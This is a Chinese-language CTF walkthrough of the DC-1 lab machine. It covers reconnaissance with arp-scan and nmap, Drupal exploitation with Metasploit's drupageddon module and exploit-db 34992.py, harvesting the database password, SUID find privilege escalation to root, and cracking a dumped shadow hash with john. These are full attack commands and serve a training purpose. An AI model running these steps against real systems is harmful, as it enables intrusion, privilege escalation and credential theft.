# 0 - 靶机部署
- 由于我的VMware版本过高，但DC-1靶机过于古早，并不兼容，所以此处我使用VirtualBox部署靶机  
- `如果` 使用这种方法，Kali虚拟机需要添加一张新的网卡，为 `桥接模式`

<p align="center">
  <img src="/EXAM/img/1/1-VirtualBox.png" width="50%">
</p>
<p align="center"><em>图0-1 VirtualBox</em></p>

> ❕ 注意
> ---
> 使用VirtualBox需要与VMware网卡互通，具体步骤如下：
> `VirtualBox` 使用HostOnly网卡，`VMware` 使用桥接网卡  
> 使得VMware网卡桥接到VirtualBox的HostOnly网卡，实现网络互通，如 `图0-2~4` 所示：
<p align="center">
  <img src="/EXAM/img/1/2-VMware虚拟网络适配器.png" width="50%">
</p>
<p align="center"><em>图0-2 VMware虚拟网络适配器</em></p>

<p align="center">
  <img src="/EXAM/img/1/3-VirtualBox网卡.png" width="50%">
</p>
<p align="center"><em>图0-3 VirtualBox网卡</em></p>

<p align="center">
  <img src="/EXAM/img/1/4-VirtualBox机器配置.png" width="50%">
</p>
<p align="center"><em>图0-4 VirtualBox机器配置</em></p>

# 1 - 信息收集
### arp-scan
- 正常来说，你的靶机不止一个网卡，和靶机处于同一网络的网卡也不一定是第一个  
- 所以 `arp-scan -l` 命令需要修改一下：
```
sudo arp-scan -I <你的网卡名> -l
```
浅浅推理一下，不难发现目标地址是多少：
<p align="center">
  <img src="/EXAM/img/1/5-kali-arp-scan.png" width="50%">
</p>
<p align="center"><em>图1-1 kali-arp-scan</em></p>

### nmap
```
nmap -sV -p- <目标IP>
```
获得如下结果：  
<p align="center">
  <img src="/EXAM/img/1/6-kali-nmap.png" width="50%">
</p>
<p align="center"><em>图1-2 kali-nmap</em></p>

注意到主机开放端口有：`22`、`80`、`111`、`57142`  
因开放了80端口，我们不妨尝试进入网页  
注意到有网站：
<p align="center">
  <img src="/EXAM/img/1/7-firefox.png" width="50%">
</p>
<p align="center"><em>图1-3 firefox</em></p>

发现网站使用了 `Drupal` 内容管理系统，这可谓是重大发现了  
后续可以对该系统，`针对性` 实施渗透  

### Metasploit
在上一步中，我们获取到了，该靶机使用 `Drupal` 内容管理系统  
我们可以在`Metasploit`中搜索关键字 `Drupal`：  
<p align="center">
  <img src="/EXAM/img/1/8-Metasploit搜索.png" width="50%">
</p>
<p align="center"><em>图1-4 Metasploit搜索</em></p>

发现有相当多的工具可以使用了  
这很好  

# 2 - 发起攻击
### 获取普通Shell
我们先使用 `Metasploit` 的 `drupal-drupageddon` 模块，尝试获取Shell
```
use exploit/multi/http/drupal_drupageddon 
set rhost <目标IP>
set lhost <Kali的IP>        # 如果你并非只有一张网卡时，需指定lhost参数
exploit
```
<p align="center">
  <img src="/EXAM/img/1/9-Metasploit攻击.png" width="50%">
</p>
<p align="center"><em>图2-1 Metasploit攻击</em></p>

出现 `meterpreter >` 后输入shell即可获取普通Shell

### 进一步获取信息
既然都进来了，我们就用 `ls` 和 `cd` 命令，随便看看  
然后就在 `/var/www/sites/default/settings.php` 里~~不经意间~~发现了数据库账密  
<p align="center">
  <img src="/EXAM/img/1/10-获取数据库账密.png" width="50%">
</p>
<p align="center"><em>图2-2 获取数据库账密</em></p>

### 建立反弹Shell
> ❓ 什么是反弹Shell？
> ---
> `反弹 Shell（Reverse Shell）`是一种远程控制方式：攻击机先开启监听端口，目标机器在漏洞利用成功后主动向攻击机发起网络连接，并将自身的命令行输入输出重定向到这条连接上，使攻击者能够在自己的机器上远程执行目标机器的命令。常用于绕过防火墙、NAT 等无法直接主动连入目标的场景。

此处我们使用Python来建立：
```
python -c 'import pty; pty.spawn("/bin/bash")'
```
<p align="center">
  <img src="/EXAM/img/1/11-建立反弹Shell.png" width="50%">
</p>
<p align="center"><em>图2-3 建立反弹Shell</em></p>

可见出现了 `www-data@DC-1:/var/www/sites/default$` ，建立成功
随后输入如下命令连接数据库：
```
mysql -udbuser -p

R0ck3t
```
<p align="center">
  <img src="/EXAM/img/1/12-连接MySQL.png" width="50%">
</p>
<p align="center"><em>图2-4 连接MySQL</em></p>

随后我们来查看一下相关数据库：
```
show databases;
use drupaldb;
show tables;
select * from users;
```
发现了admin用户，但密码是 `加密` 过的  
所以我们直接使用 `exploitdb` 中的 `php/webapps/34992.py` 进行新增admin用户  
  
新建一个终端，键入如下命令：
```
python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://靶机IP/ -u admin1 -p admin1
```
出现如下结果既创建成功：
<p align="center">
  <img src="/EXAM/img/1/13-创建admin账户.png" width="50%">
</p>
<p align="center"><em>图2-5 创建admin账户</em></p>

然后我们来尝试登录web：
<p align="center">
  <img src="/EXAM/img/1/14-登录web.png" width="50%">
</p>
<p align="center"><em>图2-6 登录web</em></p>

蒽，是能登录进来，但是没啥用（  
  
# 3 - 提权
我们先cd到 `/var/www` 然后键入如下命令，即可提权成功：
```
find / -perm -4000 2>/dev/null

touch venus
find / -type f -name venus -exec "whoami" \;
find / -type f -name venus -exec "/bin/sh" \;
```
<p align="center">
  <img src="/EXAM/img/1/15-提权.png" width="50%">
</p>
<p align="center"><em>图3-1 提权</em></p>

> ❓ 原理是什么
> ---
> 通过`find / -perm -4000 2>/dev/null`知晓了`/usr/bin/find` 被设置了 **SUID(root)**  
> 因此即使是 `www-data` 用户执行 `find`，内核也会让 `find` 进程以 **root 的有效权限（euid=root）** 运行  
> `find` 自带 `-exec` 功能，可以在搜索过程中启动其他程序，而这些被启动的程序默认会继承 `find` 的权限  
> 所以当执行 `find ... -exec whoami \;` 时，实际上是 **root 权限的 find 在执行 whoami**，因此输出 `root`  
> 同理，执行 `find ... -exec /bin/sh \;` 时，find 启动了一个继承 root 权限的 shell，于是直接获得了 root shell，实现了本地提权。

# 4 - Capture the Flag
> “Capture the Flag（CTF）”直译为“夺旗”，名称来源于传统的夺旗游戏  
> 参赛双方通过潜入、对抗、解谜或战术行动去抢夺对方旗帜作为胜利标志  
> 在网络安全领域，我们借用了这一概念
> 把系统中的某个隐藏字符串、密钥、漏洞利用结果或敏感信息设计成“Flag”
> 参赛者需要通过漏洞分析、逆向工程、密码学、Web 安全等技术手段获取它
> 因此称为 “Capture the Flag”——即通过攻防和技术挑战“夺取旗帜”

我们此时已经获取了root权限，但是一般情况下我们不直接修改密码  
我们来获取一下密码：
```
cat /etc/shadow
```
<p align="center">
  <img src="/EXAM/img/1/16-发现密码.png" width="50%">
</p>
<p align="center"><em>图4-1 发现密码</em></p>

> 此处我们只需破解flag4账户，就算夺旗成功，既渗透成功，拿到积分  
> root账户一般不用管

注意到密码是加密过的，我们不妨来解密一下   
先把 `图4-1` 中的值复制出来，比如我这里就保存到 `hash.txt`  
> 注意：只复制高亮部分  
> flag4:`$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80`:17946:0:99999:7:::


新建一个kali终端，然后使用如下指令破解：
```
john hash.txt
```
<p align="center">
  <img src="/EXAM/img/1/17-破解密码.png" width="50%">
</p>
<p align="center"><em>图4-2 破解密码</em></p>

注意到密码为orange，我们尝试登录：  
<p align="center">
  <img src="/EXAM/img/1/18-登录.png" width="50%">
</p>
<p align="center"><em>图4-3 登录</em></p>

# 🎉 至此，完成渗透